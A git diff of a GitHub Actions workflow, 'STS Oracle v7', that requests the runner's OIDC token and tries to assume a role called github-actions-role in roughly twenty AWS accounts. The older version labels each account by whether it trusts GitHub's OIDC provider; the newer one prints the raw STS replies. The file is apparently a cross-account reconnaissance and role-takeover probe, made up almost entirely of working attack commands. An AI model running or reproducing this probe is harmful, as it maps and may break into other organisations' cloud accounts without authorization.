@@ -1,4 +1,4 @@
-name: STS Oracle v6
+name: STS Oracle v7
 on:
   workflow_dispatch:
 
@@ -10,35 +10,88 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: STS Probe v6
+      - name: STS Probe v7 (exact detection run format)
         run: |
-          set +e
-          # Get token into variable directly (not via file - avoid file:// issues)
           TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
-          echo "TOKEN_LEN=${#TOKEN}"
-          # Also check our own calibration account FIRST before probing others
-          CALIB=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::062341577280:role/nonexistent-role-xyz --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true
-          if echo "$CALIB" | grep -q "AccessDenied"; then echo "CALIB=HAS_OIDC_CONFIRMED"; else echo "CALIB_RAW=$(echo $CALIB | head -c 100)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::062341577280:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "062341577280=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "062341577280=NO_OIDC"; else echo "062341577280=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::940202570803:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "940202570803=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "940202570803=NO_OIDC"; else echo "940202570803=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::975050157552:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "975050157552=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "975050157552=NO_OIDC"; else echo "975050157552=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::442042546671:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "442042546671=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "442042546671=NO_OIDC"; else echo "442042546671=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::590183853468:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "590183853468=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "590183853468=NO_OIDC"; else echo "590183853468=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::492374225042:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "492374225042=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "492374225042=NO_OIDC"; else echo "492374225042=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::941377116779:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "941377116779=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "941377116779=NO_OIDC"; else echo "941377116779=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::847111281529:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "847111281529=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "847111281529=NO_OIDC"; else echo "847111281529=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::381491896068:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "381491896068=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "381491896068=NO_OIDC"; else echo "381491896068=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::730335619062:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "730335619062=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "730335619062=NO_OIDC"; else echo "730335619062=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::582318560589:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "582318560589=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "582318560589=NO_OIDC"; else echo "582318560589=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::211125461067:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "211125461067=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "211125461067=NO_OIDC"; else echo "211125461067=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::270841023592:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "270841023592=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "270841023592=NO_OIDC"; else echo "270841023592=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::471234567890:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "471234567890=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "471234567890=NO_OIDC"; else echo "471234567890=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::832123456789:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "832123456789=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "832123456789=NO_OIDC"; else echo "832123456789=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::908765432109:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "908765432109=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "908765432109=NO_OIDC"; else echo "908765432109=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::184832476285:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "184832476285=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "184832476285=NO_OIDC"; else echo "184832476285=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::285947381625:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "285947381625=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "285947381625=NO_OIDC"; else echo "285947381625=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::392847261583:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "392847261583=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "392847261583=NO_OIDC"; else echo "392847261583=ERR:$(echo $ERR | cut -c1-80)"; fi
-            ERR=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::472638159274:role/github-actions-role --role-session-name t --web-identity-token "$TOKEN" 2>&1) || true; if echo "$ERR" | grep -q "AccessDenied"; then echo "472638159274=HAS_OIDC"; elif echo "$ERR" | grep -q "OpenIDConnect"; then echo "472638159274=NO_OIDC"; else echo "472638159274=ERR:$(echo $ERR | cut -c1-80)"; fi
-        env:
-          AWS_DEFAULT_REGION: us-east-1
+          echo "TOKEN_OK=true"
+            R_CALIB=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "062341577280: $R_CALIB"
+            R_A=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::940202570803:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "940202570803: $R_A"
+            R_B=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::975050157552:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "975050157552: $R_B"
+            R_C=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::442042546671:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "442042546671: $R_C"
+            R_D=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::590183853468:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "590183853468: $R_D"
+            R_E=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::492374225042:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "492374225042: $R_E"
+            R_F=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::941377116779:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "941377116779: $R_F"
+            R_G=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::847111281529:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "847111281529: $R_G"
+            R_H=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::381491896068:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "381491896068: $R_H"
+            R_I=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::730335619062:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "730335619062: $R_I"
+            R_J=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::582318560589:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "582318560589: $R_J"
+            R_K=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::211125461067:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "211125461067: $R_K"
+            R_L=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::270841023592:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "270841023592: $R_L"
+            R_M=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471234567890:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471234567890: $R_M"
+            R_N=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::832123456789:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "832123456789: $R_N"
+            R_O=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::908765432109:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "908765432109: $R_O"
+            R_P=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::184832476285:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "184832476285: $R_P"
+            R_Q=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::285947381625:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "285947381625: $R_Q"
+            R_R=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::392847261583:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "392847261583: $R_R"
+            R_S=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::472638159274:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "472638159274: $R_S"
